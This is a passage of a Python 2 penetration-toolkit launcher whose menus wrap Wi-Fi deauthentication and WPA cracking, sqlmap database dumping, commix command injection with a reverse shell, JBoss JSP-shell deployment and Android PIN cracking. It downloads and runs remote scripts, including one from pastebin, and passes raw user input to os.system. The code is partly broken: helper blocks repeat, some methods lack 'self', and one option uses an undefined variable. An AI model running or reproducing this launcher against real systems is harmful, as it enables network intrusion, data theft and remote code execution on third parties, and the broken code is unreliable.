        os.system("cd %s && mkdir build && cd build && cmake .. && make && make install" % self.installDir)

    def run(self):
        clearScr()
        print(self.kismet_logo)
        interface = raw_input(self.targetPrompt)
        self.menu(interface)

    def menu(self, interface):
        clearScr()
        print(self.kismet_logo)
        print("   Kismet Commands for Interface: %s\n" % interface)
        print("   {1}--Basic Network Scan")
        print("   {2}--Channel Hopping")
        print("   {3}--GPS Logging")
        print("   {4}--Packet Sniffing with Logging")
        print("   {99}-Return to previous menu \n")
        response = raw_input("kismet ~# ")
        clearScr()
        logPath = "logs/kismet-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("kismet -c %s > %s" % (interface, logPath))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("kismet -c %s -X > %s" % (interface, logPath))  # Enable channel hopping
                response = raw_input(continuePrompt)
            elif response == "3":
                gps_file = logPath.replace(".log", ".gpsxml")
                os.system("kismet -c %s --use-gpsd -t %s" % (interface, gps_file))  # Enable GPS logging
                response = raw_input(continuePrompt)
            elif response == "4":
                os.system("kismet -c %s -t %s" % (interface, logPath))  # Log packets to file
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(interface)
        except KeyboardInterrupt:
            self.menu(interface)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."


import os
from time import strftime, gmtime

class AircrackNGTool:
    aircrack_logo = """
   ___       _                  _     _   _ 
  / _ \     | |                (_)   | | | |
 / /_\ \ ___| |_ _   _ _ __ ___  _  __| | | |
 |  _  |/ __| __| | | | '_ ` _ \| |/ _` | | |
 | | | | (__| |_| |_| | | | | | | | (_| | |_|
 \_| |_/\___|\__|\__,_|_| |_| |_|_|\__,_| (_)
"""
    def __init__(self):
        self.installDir = toolDir + "aircrack-ng"
        self.gitRepo = "https://github.com/aircrack-ng/aircrack-ng.git"
        
        self.interfacePrompt = "   Enter the wireless interface to use (e.g., wlan0): "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.system("which aircrack-ng > /dev/null 2>&1") == 0

    def install(self):
        # Clone the Aircrack-ng repository and build it
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && make && make install" % self.installDir)

    def run(self):
        clearScr()
        print(self.aircrack_logo)
        interface = raw_input(self.interfacePrompt)
        self.menu(interface)

    def menu(self, interface):
        clearScr()
        print(self.aircrack_logo)
        print("   Aircrack-ng Operations with Interface: %s\n" % interface)
        print("   {1}--Monitor Mode")
        print("   {2}--Capture Packets")
        print("   {3}--De-authenticate Clients")
        print("   {4}--Crack WEP/WPA Handshake")
        print("   {5}--Fake Authentication Attack")
        print("   {99}-Return to previous menu \n")
        response = raw_input("aircrack-ng ~# ")
        clearScr()
        logPath = "logs/aircrack-ng-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("airmon-ng start %s" % interface)
                response = raw_input(continuePrompt)
            elif response == "2":
                target_bssid = raw_input("Enter the target BSSID: ")
                channel = raw_input("Enter the channel (optional): ")
                output_file = raw_input("Enter the output file prefix: ")
                os.system("airodump-ng -c %s --bssid %s -w %s %s" % (channel, target_bssid, output_file, interface))
                response = raw_input(continuePrompt)
            elif response == "3":
                target_bssid = raw_input("Enter the target BSSID: ")
                client_mac = raw_input("Enter the client MAC address (optional, press Enter for broadcast): ")
                os.system("aireplay-ng --deauth 10 -a %s -c %s %s" % (target_bssid, client_mac, interface))
                response = raw_input(continuePrompt)
            elif response == "4":
                handshake_file = raw_input("Enter the path to the captured handshake file: ")
                wordlist = raw_input("Enter the path to the wordlist file: ")
                os.system("aircrack-ng -w %s -b %s %s" % (wordlist, target_bssid, handshake_file))
                response = raw_input(continuePrompt)
            elif response == "5":
                target_bssid = raw_input("Enter the target BSSID: ")
                os.system("aireplay-ng --fakeauth 0 -a %s %s" % (target_bssid, interface))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(interface)
        except KeyboardInterrupt:
            self.menu(interface)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."



class bluepot:
    def __init__(self):
        self.installDir = toolDir + "bluepot"

        if not self.installed():
            self.install()
        clearScr()
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("apt-get install libbluetooth-dev")
        os.system(
            "wget -O - https://github.com/andrewmichaelsmith/bluepot/raw/master/bin/bluepot-0.1.tar.gz | tar xfz -")
        os.system("mv bluepot/ %s/" % self.installDir)

    def run(self):
        os.system("sudo java -jar %s/BluePot-0.1.jar" % self.installDir)


'''
Exploitation Tools Classes
'''


class exploitationToolsMenu:
    menuLogo = '''
    
  ______ __   __ _____   _       ____  _____  _______ 
 |  ____|\ \ / /|  __ \ | |     / __ \|_   _||__   __|
 | |__    \ V / | |__) || |    | |  | | | |     | |   
 |  __|    > <  |  ___/ | |    | |  | | | |     | |   
 | |____  / . \ | |     | |____| |__| |_| |_    | |   
 |______|/_/ \_\|_|     |______|\____/|_____|   |_|   
                                                      
                                                      

    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print("   {1}--ATSCAN")
        print("   {2}--sqlmap")
        print("   {3}--Exploit-DB")
        print("   {4}--commix")
        print("   {5}--FTP Auto Bypass")
        print("   {6}--JBoss-Autopwn")
        print("   {7}--Blind SQL Automatic Injection And Exploit")
        print("   {8}--Bruteforce the Android Passcode given the hash and salt")
        print("   {9}--Joomla SQL injection Scanner \n ")
        print("   {99}-Go Back To Main Menu \n")
        choice5 = raw_input(sayahacPrompt)
        clearScr()
        if choice5 == "1":
            ATSCANTool()
        elif choice5 == "2":
            SQLMapTool()
        elif choice5 == "3":
            ExploitDBTool()
        elif choice5 == "4":
            CommixTool()
        elif choice5 == "5":
            gabriel()
        elif choice5 == "6":
            jboss()
        elif choice5 == "7":
            bsqlbf()
        elif choice5 == "8":
            androidhash()
        elif choice5 == "9":
            cmsfew()
        elif choice5 == "99":
            sayahac()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class ATSCANTool:
    atscan_logo = """
   _____  _   _ _______  _______   _____ _   _ 
  / ____|| | | |__   __||__   __| / ____| \ | |
 | |     | |_| |  | |      | |   | |    |  \| |
 | |     |  _  |  | |      | |   | |    | . ` |
 | |____ | | | |  | |      | |   | |____| |\  |
  \_____||_| |_|  |_|      |_|    \_____||_| \_|
"""
    def __init__(self):
        self.installDir = toolDir + "atscan"
        self.gitRepo = "https://github.com/AlisamTechnology/ATSCAN.git"
        
        self.targetPrompt = "   Enter the target (IP, domain, or keyword for dorking): "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.installDir + "/atscan.pl")

    def install(self):
        # Clone the ATSCAN repository and set it up
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && chmod +x atscan.pl" % self.installDir)

    def run(self):
        clearScr()
        print(self.atscan_logo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.atscan_logo)
        print("   ATSCAN Operation for Target: %s\n" % target)
        print("   {1}--Basic Dorking Search")
        print("   {2}--Vulnerability Scan")
        print("   {3}--Port Scanning")
        print("   {4}--Admin Page Finder")
        print("   {5}--Exploit Search")
        print("   {99}-Return to previous menu \n")
        response = raw_input("atscan ~# ")
        clearScr()
        logPath = "logs/atscan-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("perl %s/atscan.pl -d %s" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "2":
                vuln_type = raw_input("Enter the vulnerability type (e.g., SQLi, XSS): ")
                os.system("perl %s/atscan.pl -d %s --vuln %s" % (self.installDir, target, vuln_type))
                response = raw_input(continuePrompt)
            elif response == "3":
                os.system("perl %s/atscan.pl -t %s --portscan" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "4":
                os.system("perl %s/atscan.pl -t %s --admin" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "5":
                exploit = raw_input("Enter exploit keyword: ")
                os.system("perl %s/atscan.pl -d %s --exploit %s" % (self.installDir, target, exploit))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."


class SQLMapTool:
    sqlmap_logo = """
  _____ ____  _      __  __           
 / ____/ __ \| |    |  \/  |          
| (___| |  | | |    | \  / | ___ _ __ 
 \___ \| |  | | |    | |\/| |/ _ \ '__|
 ____) | |__| | |____| |  | |  __/ |   
|_____/ \___\_\______|_|  |_|\___|_|   
"""
    def __init__(self):
        self.installDir = toolDir + "sqlmap"
        self.gitRepo = "https://github.com/sqlmapproject/sqlmap.git"
        
        self.targetPrompt = "   Enter the target URL for SQL injection: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.installDir + "/sqlmap.py")

    def install(self):
        # Clone the SQLmap repository
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))

    def run(self):
        clearScr()
        print(self.sqlmap_logo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.sqlmap_logo)
        print("   SQLMap Attack on Target: %s\n" % target)
        print("   {1}--Basic SQL Injection")
        print("   {2}--Enumerate Databases")
        print("   {3}--Dump Database Tables")
        print("   {4}--Get DBMS Banner")
        print("   {5}--Search for Specific Columns")
        print("   {99}-Return to previous menu \n")
        response = raw_input("sqlmap ~# ")
        clearScr()
        logPath = "logs/sqlmap-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("python2 %s/sqlmap.py -u %s --batch" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("python2 %s/sqlmap.py -u %s --dbs --batch" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "3":
                db = raw_input("Enter the database name to dump tables from: ")
                os.system("python2 %s/sqlmap.py -u %s -D %s --tables --batch" % (self.installDir, target, db))
                response = raw_input(continuePrompt)
            elif response == "4":
                os.system("python2 %s/sqlmap.py -u %s --banner --batch" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "5":
                column = raw_input("Enter the column name to search for: ")
                os.system("python2 %s/sqlmap.py -u %s --search -C %s --batch" % (self.installDir, target, column))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."



class ExploitDBTool:
    exploit_logo = """
  ______           _ _     _   ____  ____  
 |  ____|         (_) |   | | |  _ \|  _ \ 
 | |__   _ __ ___  _| | __| | | |_) | |_) |
 |  __| | '_ ` _ \| | |/ _` | |  _ <|  __/ 
 | |____| | | | | | | | (_| | | |_) | |    
 |______|_| |_| |_|_|_|\__,_| |____/|_|    
"""
    def __init__(self):
        self.installDir = toolDir + "exploit-db"
        self.gitRepo = "https://github.com/offensive-security/exploitdb.git"
        
        self.targetPrompt = "   Enter the software name or keyword to search for exploits: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile("/usr/bin/searchsploit")

    def install(self):
        # Clone the Exploit-DB repository and install searchsploit
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && ./searchsploit -u" % self.installDir)

    def run(self):
        clearScr()
        print(self.exploit_logo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.exploit_logo)
        print("   Exploit-DB Search for: %s\n" % target)
        print("   {1}--Search for Exploits")
        print("   {2}--Search by Software Version")
        print("   {3}--Search for Shellcodes")
        print("   {4}--View Exploit Details")
        print("   {5}--Download Exploit")
        print("   {99}-Return to previous menu \n")
        response = raw_input("searchsploit ~# ")
        clearScr()
        logPath = "logs/exploitdb-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("searchsploit %s" % target)
                response = raw_input(continuePrompt)
            elif response == "2":
                version = raw_input("Enter the software version (e.g., 1.2.3): ")
                os.system("searchsploit %s %s" % (target, version))
                response = raw_input(continuePrompt)
            elif response == "3":
                os.system("searchsploit --shellcode %s" % target)
                response = raw_input(continuePrompt)
            elif response == "4":
                exploit_id = raw_input("Enter the Exploit ID or Path: ")
                os.system("searchsploit -x %s" % exploit_id)
                response = raw_input(continuePrompt)
            elif response == "5":
                exploit_id = raw_input("Enter the Exploit ID or Path to download: ")
                os.system("searchsploit -m %s" % exploit_id)
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."




class CommixTool:
    commix_logo = """
   _____                            _        
  / ____|                          | |       
 | |     ___  _ ____   _____ _ __ __| | __ _  
 | |    / _ \| '_ \ \ / / _ \ '__/ _` |/ _` | 
 | |___| (_) | | | \ V /  __/ | | (_| | (_| | 
  \_____\___/|_| |_|\_/ \___|_|  \__,_|\__,_| 
"""
    def __init__(self):
        self.installDir = toolDir + "commix"
        self.gitRepo = "https://github.com/commixproject/commix.git"
        
        self.targetPrompt = "   Enter the target URL for command injection: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.installDir + "/commix.py")

    def install(self):
        # Clone the Commix repository
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && chmod +x commix.py" % self.installDir)

    def run(self):
        clearScr()
        print(self.commix_logo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.commix_logo)
        print("   Commix Attack on Target: %s\n" % target)
        print("   {1}--Basic Command Injection Test")
        print("   {2}--OS Command Injection with Reverse Shell")
        print("   {3}--File Upload via Command Injection")
        print("   {4}--Enumerate System Information")
        print("   {5}--Bypass WAF/Filter Detection")
        print("   {99}-Return to previous menu \n")
        response = raw_input("commix ~# ")
        clearScr()
        logPath = "logs/commix-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("python2 %s/commix.py --url=%s --batch" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "2":
                lhost = raw_input("Enter your listener IP (LHOST): ")
                lport = raw_input("Enter your listener port (LPORT): ")
                os.system("python2 %s/commix.py --url=%s --os-shell --reverse-shell --lhost=%s --lport=%s --batch" % (self.installDir, target, lhost, lport))
                response = raw_input(continuePrompt)
            elif response == "3":
                upload_path = raw_input("Enter the path to upload the file: ")
                file_path = raw_input("Enter the file path to upload: ")
                os.system("python2 %s/commix.py --url=%s --file-write=%s --file-dest=%s --batch" % (self.installDir, target, file_path, upload_path))
                response = raw_input(continuePrompt)
            elif response == "4":
                os.system("python2 %s/commix.py --url=%s --os-cmd='uname -a' --batch" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "5":
                os.system("python2 %s/commix.py --url=%s --level=3 --batch" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."


class gabriel:

    def gabriel():
        print("Abusing authentication bypass of Open&Compact (Gabriel's)")
        os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
        clearScr()
        os.system("python gabriel.py")
        ftpbypass = raw_input("Enter Target IP and Use Command:")
        os.system("python gabriel.py %s" % ftpbypass)


class jboss:

    def jboss():
        clearScr()
        print ("This JBoss script deploys a JSP shell on the target JBoss AS server. Once")
        print ("deployed, the script uses its upload and command execution capability to")
        print ("provide an interactive session.")
        print ("")
        print ("usage: ./e.sh target_ip tcp_port ")
        print("Continue: y/n")
        if yesOrNo():
            os.system(
                "git clone --depth=1 https://github.com/SpiderLabs/jboss-autopwn.git"), sys.exit()
        else:
            sayahac()


class bsqlbf:

    def bsqlbf():
        clearScr()
        print("This tool will only work on blind sql injection")
        cbsq = raw_input("select target: ")
        os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
        os.system("perl bsqlbf.pl -url %s" % cbsq)
        os.system("rm bsqlbf.pl")


class androidhash:

    def androidhash():
        key = raw_input("Enter the android hash: ")
        salt = raw_input("Enter the android salt: ")
        os.system(
        "git clone --depth=1 https://github.com/PentesterES/AndroidPINCrack.git")
        os.system(
        "cd AndroidPINCrack && python AndroidPINCrack.py -H %s -s %s" % (key, salt))

class cmsfew:
    
    def cmsfew():
        print("your target must be Joomla, Mambo, PHP-Nuke, and XOOPS Only ")
        target = raw_input("Select a target: ")
        os.system(
        "wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py")
        os.system("python cms.py %s" % target)




if __name__ == "__main__":
    try:
        agreement()
        sayahac()
    except KeyboardInterrupt:
        print(" Finishing up...\n")
        time.sleep(0.25)
